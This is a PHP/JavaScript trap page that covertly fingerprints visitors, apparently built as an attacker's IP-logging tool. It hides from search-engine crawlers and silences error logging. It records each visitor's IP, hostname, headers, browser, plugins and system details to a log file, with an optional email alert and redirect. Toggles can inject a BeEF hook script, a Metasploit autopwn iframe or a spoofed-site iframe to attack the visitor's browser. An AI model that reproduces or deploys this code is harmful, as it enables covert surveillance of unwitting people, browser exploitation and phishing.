<!DOCTYPE html>
<html>
<head>

<?php

 /* --------------------[settings]-------------------- */ 

  // 0 - Off
  // 1 - On

  ini_set('error_log', NULL);
  ini_set('log_errors', 0);
  ini_set('max_execution_time', 0);
  ini_set('error_reporting', 0);
  set_time_limit(0);

  define('hash', md5(rand(1, 1337).$_SERVER['REMOTE_ADDR'].time()));
  define('time', date("m.d.y H:i:s"));

  // Output
  define('output', 'output.html');

  // Email notification
  define('email_notify', 0);
  define('notify_address', 'usr@box.com');

  // Redirect
  define('redirect', 0); 
  define('redirect_url', 'http://host/');

  // Website spoofing
  define('use_spoofing', 0);
  define('spoof_url', 'http://host/');

  // Beef js hook (or custom js)
  define('use_beef', 0);
  define('hook_url', 'http://192.168.0.10:31337/hook.js');

  // Metasploit browser_autopwn http server (or custom iframe)
  define('use_autopwn', 0);
  define('autopwn_url', 'http://192.168.0.10:8080/woot');

/* --------------------------------------------------- */


if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

if(isset($_POST['data']) && file_exists(output) && is_writable(output)) {
  $fp = fopen(output, 'a');
  fwrite($fp, $_POST['data']);
  fclose($fp);
}

if(file_exists(output) && filesize(output) < 5) {
  $fp    = fopen('steal.html', 'a');
  $style = '<!DOCTYPE html><html><head><meta charset="UTF-8"><style>'.
           'html { margin: 20%; } div.text { margin-left: 20%; margin-right: 10%; } body { background-color: #F5F5F5; } h3 { margin: 1em 0 0.5em 0; margin-left:-2%; color: #343434; font-weight: normal; font-size: 30px; line-height: 40px; } h4 { margin: 1em 0 0.5em 0; color: #343434; font-weight: normal; font-size: 30px; line-height: 40px; } h4:hover{ margin: 1em 0 0.5em 0; color: #1a1a1a; font-weight: 450; font-size: 30px; line-height: 40px; } table { font-family: verdana,arial,sans-serif; font-size:11px; color:#333333; border-width: 1px; border-color: #666666; border-collapse: collapse; } table th { border-width: 1px; padding: 8px; border-style: solid; border-color: #666666; background-color: #dedede; } table td { border-width: 1px; padding: 8px; border-style: solid; border-color: #666666; background-color: #f0f0f0; } a { text-decoration: none; color: 333333; } a:link, a:visited, a:active { color: #333333; } hr { border: 0; height: 0; border-top: 1px solid rgba(0, 0, 0, 0.1); border-bottom: 1px solid rgba(255, 255, 255, 0.3); } b { color: #484848; font-weight: normal; font-size: 17px; line-height: 25px; } p { text-align: center; color: #484848; font-weight: normal; font-size: 17px; line-height: 20px; }'.
           '</style>'.
           '<script type="text/javascript">function show(id) { var e = document.getElementById(id); if(e.style.display == \'block\') e.style.display = \'none\'; else e.style.display = \'block\'; } </script>'.
           '</head><body>';
  fwrite($fp, $style);
  fclose($fp);
} 

function notify() {

 $headers  = "MIME-Version: 1.0\n" ;
 $headers .= "Content-Type: text/html; charset=\"iso-8859-1\"\n";
 $headers .= "X-Priority: 1 (Highest)\n";
 $headers .= "X-MSMail-Priority: High\n";
 $headers .= "Importance: High\n";

  mail(notify_address, 'Sup?', 'IP logged - '.$_SERVER['REMOTE_ADDR'], $headers);

}

function nojs() {  

$ip   = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($ip);

if(!isset($_SERVER['HTTP_REFERER'])) { $ref = 'None'; } else { $ref = htmlspecialchars($_SERVER['HTTP_REFERER']); }
if(function_exists('getallheaders')) {
foreach(getallheaders() as $header => $info) {
  $req .= htmlspecialchars($header).' - '.htmlspecialchars($info).'<br />';
} 
} else { $req = 'Undefined'; }

$data = '<center><a href="#'.hash.'" onclick="show(\''.hash.'\');"><h4>'.$ip.'</h4></a></center>'.
'<div id="'.hash.'" style="display:none;"><hr /><p>'.time.'</p><div class="text">'.
'<h3>Info</h3>'.
'<br />IP - <a href="http://ipinfo.io/'.$ip.'">'.$ip.'</a>'.
'<br />Host - '.$host.
'<br />Referer - '.$ref.
'<br />Javascript not enabled!'.
'<br /><h3>Request headers</b></h3> '.$req;

if(file_exists(output) && is_writable(output)) {
  $fp = fopen(output, 'a');
  fwrite($fp, $data.'</div><br /><hr /></div>');
  fclose($fp);
}

if(redirect == 1) {
  header('Location: '.redirect_url);
}

}

if(isset($_GET['nojs'])) {
  nojs();
  exit;
}

?>

<script type="text/javascript">

function configVar() {
  var config = {
    host:"<?php echo 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];?>",
    redirect:"<?php echo redirect; ?>",
    redirect_url:"<?php echo redirect_url; ?>",
    time:"<?php echo time; ?>"
  };
  return config;
}

function getUserData() {

  if(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection) { var rtcs = 'true'; }      else { var rtcs = 'false'; }
    
 if (typeof(navigator.oscpu) != "undefined" && navigator.oscpu !== null) {
  var osff = " ("+navigator.oscpu+") ";
 } else {
  var osff = "";   
 }
    
  var userData = {
    ip:"<?php echo htmlspecialchars($_SERVER['REMOTE_ADDR']); ?>",
    ref:"<?php if(!isset($_SERVER['HTTP_REFERER'])) { echo 'None'; } else { echo htmlspecialchars($_SERVER['HTTP_REFERER']); } ?>",
    host:"<?php echo htmlspecialchars(gethostbyaddr($_SERVER['REMOTE_ADDR'])); ?>",
    accept:"<?php echo htmlspecialchars($_SERVER['HTTP_ACCEPT']); ?>",
    hash:"<?php echo hash; ?>",
    browser:navigator.appCodeName+" ("+navigator.appName+") ",
    resolution:window.screen.availWidth+"x"+window.screen.availHeight,
    bresolution:window.outerWidth+"x"+window.outerHeight,
    colordepth:screen.colorDepth+" bit",
    browserver:navigator.appVersion,
    useragent:navigator.userAgent,
    os:navigator.platform+osff,
    cookie:navigator.cookieEnabled,
    lang:navigator.language,
    build:navigator.buildID,
    comp:navigator.productSub,
    rtc:rtcs,
  };
  return userData;
}

function getBrowserPlugins() {
var L = navigator.plugins.length;
var plugs = new Array();
for(var i = 0; i < L; i++) {
  var plug = navigator.plugins[i];
  plugs.push("<tr><td>" + plug.name + "</td><td>" + plug.filename + "</td><td>" + plug.description + "</td><td>" + plug.version + "</td></tr>");
}
return encodeURI("<br /><center><b>" + L.toString() + " Plugin(s) Detected</b><br><table border=1 width=\"80%\"><tr><th>Name</th><th>Filename</th><th>Description</th><th>Version</th></tr>" + plugs.join('') + "</table></center>");
}
    
function webgl_detect(return_context)
{
    if (!!window.WebGLRenderingContext) {
        var canvas = document.createElement("canvas"),
             names = ["webgl", "experimental-webgl", "moz-webgl", "webkit-3d"],
           context = false;

        for(var i=0;i<4;i++) {
            try {
                context = canvas.getContext(names[i]);
                if (context && typeof context.getParameter == "function") {
                    if (return_context) {
                        return {name:names[i], gl:context};
                    }
                    return true;
                }
            } catch(e) {}
        }
        return false;
    }
    return false;
}
    
function cores() {
 
    if (typeof(navigator.hardwareConcurrency) != "undefined" && navigator.hardwareConcurrency !== null) {
        return "<b>CPU Cores:</b> "+navigator.hardwareConcurrency+"<br />";
    } else if (typeof(navigator.cpuClass) != "undefined" && navigator.cpuClass !== null) {
        return "<b>CPU Class:</b> "+navigator.cpuClass+"<br />";
    }
    else { return ''; }
    
}
    
function getPlugins() {
  if (navigator.plugins) {

    var quickt = false;
    var flash  = false;
    var silverlight = false;
    var javax = navigator.javaEnabled();
    var webgl =  webgl_detect();

if (navigator.plugins["QuickTime"] )
{ quickt = true; }

try {
  var fo = new ActiveXObject('ShockwaveFlash.ShockwaveFlash');
  if (fo) {
    flash = true;
  }
} catch (e) {
  if (navigator.mimeTypes
        && navigator.mimeTypes['application/x-shockwave-flash'] != undefined
        && navigator.mimeTypes['application/x-shockwave-flash'].enabledPlugin) {
    flash = true;
  }
}

try
{
    var slControl = new ActiveXObject('AgControl.AgControl');
    silverlight = true;
}
catch (e)
{
if (navigator.plugins["Silverlight Plug-In"])
    {
  silverlight = true;
    }
}

var data = new Object();
    data['quicktime']   = quickt;
    data['flash']       = flash;
    data['silverlight'] = silverlight;
    data['java']        = javax;
    data['webgl']       = webgl;
return data;

}
 
}

function sendData(data) {
 var xhr  = new XMLHttpRequest();
 var divout = '<br /><hr /></div>';
 xhr.open("POST", config["host"], true);
 xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 xhr.withCredentials = true;
 var body = "data="+data+getBrowserPlugins()+divout;
 var aBody = new Uint8Array(body.length);
 for (var i = 0; i < aBody.length; i++)
   aBody[i] = body.charCodeAt(i); 
 xhr.send(new Blob([aBody]));
}

</script>
</head>

<body style="margin: 0; padding: 0; height: 100%; overflow: hidden;">

<script type="text/javascript">

var userData = getUserData();
var date = new Date();
var data = getPlugins();
var config = configVar();

var datax = encodeURI("<center><a href=\"#"+userData["hash"]+"\" onclick=\"show('"+userData["hash"]+"');\"><h4>"+userData["ip"]+"</h4></a></center>"+
  "<div id=\""+userData['hash']+"\" style=\"display:none;\"><hr /><p>"+config["time"]+"</p><div class=\"text\">"+
  "<h3>Host</h3>"+
  "<b>IP:</b> <a href=\"http://ipinfo.io/"+userData["ip"]+"\">"+userData["ip"]+"</a><br />"+
  "<b>Hostname:</b> "+userData["host"]+"<br />"+
  "<b>Referer:</b> "+userData["ref"]+"<br />"+
  "<h3>Browser</h3>"+
  "<b>Browser:</b> "+userData["browser"]+"<br />"+
  "<b>Browser version:</b> "+userData["browserver"]+"<br />"+
  "<b>UserAgent:</b> "+userData["useragent"]+"<br />"+
  "<b>HTTP Accept:</b> "+userData["accept"]+"<br />"+
  "<b>Allow cookie:</b> "+userData["cookie"]+"<br />"+
  "<b>Browser language:</b> "+userData["lang"]+"<br />"+
  "<b>Build ID (YYYYMMDDHH):</b> "+userData["build"]+"<br />"+
  "<b>Compilation:</b> "+userData["comp"]+"<br />"+
  "<h3>Platform</h3>"+
  "<b>OS:</b> "+userData["os"]+"<br />"+
  cores()+
  "<b>Resolution:</b> "+userData["resolution"]+"<br />"+
  "<b>Browser size:</b> "+userData["bresolution"]+"<br />"+
  "<b>Color depth:</b> "+userData["colordepth"]+"<br />"+
  "<h3>Time</h3>"+
  "<b>User pc time:</b> "+date.toLocaleString()+"<br />"+
  "<b>Local time:</b> "+date.toGMTString()+"<br />"+
  "<h3>Software</h3>"+
  "<b>Java:</b> "+data['java']+"<br />"+
  "<b>Flash:</b> "+data['flash']+"<br />"+
  "<b>Silverlight:</b> "+data['silverlight']+"<br />"+
  "<b>QuickTime:</b> "+data['quicktime']+"<br />"+
  "<b>WebGL:</b> "+data['webgl']+"<br />"+
  "<b>WebRTC:</b> "+userData['rtc']+"<br /></div>");

sendData(datax);

if(config["redirect"] == 1) {
    window.setTimeout(function(){
        window.location.href = config["redirect_url"];
    }, 1);
}

</script>

<?php

if(email_notify == 1) { notify(); }
if(use_beef     == 1) { echo '<script src="'.hook_url.'"></script>'; }
if(use_autopwn  == 1) { echo '<iframe src="'.autopwn_url.'"></iframe>'; }
if(use_spoofing == 1) { echo '<iframe src="'.spoof_url.'" height="100%" width="100%" frameborder="0"></iframe>'; }

?>

<noscript>
<meta http-equiv="refresh" content="0;url=?nojs"/>
</noscript>

</body>
</html>
